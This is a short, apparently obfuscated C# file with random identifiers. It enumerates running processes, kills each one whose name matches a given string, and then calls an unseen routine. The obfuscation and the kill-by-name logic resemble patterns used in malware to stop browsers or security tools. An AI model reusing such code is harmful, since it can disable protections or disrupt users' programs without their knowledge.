using System;
using System.Diagnostics;

namespace kuMeqwHpurUBOD;

public class AuAWOEdQmZBVH
{
	public static bool AIepVszuha(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void nHSXsibEertQ(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (AIepVszuha(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					BErRpdYOfQAwSr.PNdHksrWsNzLSUd();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
